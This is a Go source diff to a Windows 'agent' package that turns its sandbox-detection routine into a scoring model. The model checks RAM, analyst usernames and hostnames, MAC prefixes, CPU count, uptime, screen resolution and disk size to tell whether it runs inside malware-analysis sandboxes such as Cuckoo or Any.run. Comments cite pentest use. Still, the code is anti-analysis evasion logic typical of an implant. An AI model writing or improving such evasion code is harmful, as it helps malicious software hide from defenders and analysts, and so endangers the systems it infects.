@@ -5,6 +5,7 @@ package agent
 import (
 	"net"
 	"os"
+	"runtime"
 	"strings"
 	"unsafe"
 
@@ -12,13 +13,15 @@ import (
 )
 
 var (
-	modKernel32       = windows.NewLazySystemDLL("kernel32.dll")
-	modUser32sb       = windows.NewLazySystemDLL("user32.dll")
-	procGlobalMemStat = modKernel32.NewProc("GlobalMemoryStatusEx")
-	procGetLastInput  = modUser32sb.NewProc("GetLastInputInfo")
-	procGetTick64     = modKernel32.NewProc("GetTickCount64")
-	procGetCursorPos  = modUser32sb.NewProc("GetCursorPos")
-	procSleepSb       = modKernel32.NewProc("Sleep")
+	modKernel32          = windows.NewLazySystemDLL("kernel32.dll")
+	modUser32sb          = windows.NewLazySystemDLL("user32.dll")
+	procGlobalMemStat    = modKernel32.NewProc("GlobalMemoryStatusEx")
+	procGetLastInput     = modUser32sb.NewProc("GetLastInputInfo")
+	procGetTick64        = modKernel32.NewProc("GetTickCount64")
+	procGetCursorPos     = modUser32sb.NewProc("GetCursorPos")
+	procSleepSb          = modKernel32.NewProc("Sleep")
+	procGetDiskFreeSpace = modKernel32.NewProc("GetDiskFreeSpaceExW")
+	procGetSysMetrics    = modUser32sb.NewProc("GetSystemMetrics")
 )
 
 // memoryStatusEx mirrors the Windows MEMORYSTATUSEX struct.
@@ -40,7 +43,7 @@ type lastInputInfo struct {
 }
 
 // vmMACPrefixes lists MAC prefixes used exclusively by automated sandbox
-// environments (Cuckoo, Any.run, etc.).  Proxmox/QEMU (52:54:00), Hyper-V,
+// environments (Cuckoo, Any.run, etc.). Proxmox/QEMU (52:54:00), Hyper-V,
 // Xen and bare-metal VMware ESXi are intentionally excluded — those are
 // legitimate pentest targets, not sandboxes.
 var vmMACPrefixes = [][3]byte{
@@ -83,39 +86,83 @@ func checkMouseActivity() bool {
 	return p1.X == p2.X && p1.Y == p2.Y
 }
 
+// isSandbox uses an accumulated scoring model: each indicator adds points,
+// and the environment is treated as a sandbox when the total meets the
+// threshold. No single weak signal causes a false positive.
 func isSandbox() bool {
-	// Only flag obvious automated sandbox indicators — nothing that could
-	// appear on a legitimate pentest target (VM, server, low-spec machine).
+	const threshold = 3
+	score := 0
 
-	// RAM < 512 MB — only truly minimal sandbox VMs go this low
+	// ── RAM ─────────────────────────────────────────────────────────────────
 	var ms memoryStatusEx
 	ms.dwLength = uint32(unsafe.Sizeof(ms))
 	procGlobalMemStat.Call(uintptr(unsafe.Pointer(&ms)))
-	if ms.ullTotalPhys > 0 && ms.ullTotalPhys < 512*1024*1024 {
-		return true
+	if ms.ullTotalPhys > 0 {
+		if ms.ullTotalPhys < 512*1024*1024 {
+			score += 3 // extremely rare on any real target
+		} else if ms.ullTotalPhys < 2*1024*1024*1024 {
+			score++
+		}
 	}
 
-	// Dedicated sandbox/AV-lab usernames — never appear on real targets
+	// ── Sandbox usernames ────────────────────────────────────────────────────
 	user := strings.ToLower(os.Getenv("USERNAME"))
 	for _, n := range []string{
 		"sandbox", "malware", "virus", "cuckoo", "analyst",
 		"maltest", "vmuser", "wilbert", "klone",
 	} {
 		if user == n {
-			return true
+			score += 3
+			break
 		}
 	}
 
-	// Dedicated sandbox hostnames
+	// ── Sandbox hostnames ────────────────────────────────────────────────────
 	hostname, _ := os.Hostname()
 	hn := strings.ToLower(hostname)
 	for _, h := range []string{
 		"sandbox", "cuckoo", "malware", "virus", "win7malware",
 	} {
 		if strings.Contains(hn, h) {
-			return true
+			score += 3
+			break
 		}
 	}
 
-	return false
+	// ── MAC prefix from known sandbox-only vendors ───────────────────────────
+	if isVM() {
+		score++
+	}
+
+	// ── CPU cores < 2 ────────────────────────────────────────────────────────
+	if runtime.NumCPU() < 2 {
+		score++
+	}
+
+	// ── System uptime < 5 min (sandbox spun up just for this sample) ─────────
+	if upMs, _, _ := procGetTick64.Call(); upMs > 0 && upMs < 5*60*1000 {
+		score++
+	}
+
+	// ── Screen 800×600 (classic sandbox resolution) ──────────────────────────
+	if cx, _, _ := procGetSysMetrics.Call(0); int(cx) == 800 {
+		if cy, _, _ := procGetSysMetrics.Call(1); int(cy) == 600 {
+			score += 2
+		}
+	}
+
+	// ── Disk C: < 40 GB (sandboxes use minimal disk) ─────────────────────────
+	cDrive := [4]uint16{'C', ':', '\\', 0}
+	var totalBytes uint64
+	procGetDiskFreeSpace.Call(
+		uintptr(unsafe.Pointer(&cDrive[0])),
+		0,
+		uintptr(unsafe.Pointer(&totalBytes)),
+		0,
+	)
+	if totalBytes > 0 && totalBytes < 40*1024*1024*1024 {
+		score++
+	}
+
+	return score >= threshold
 }
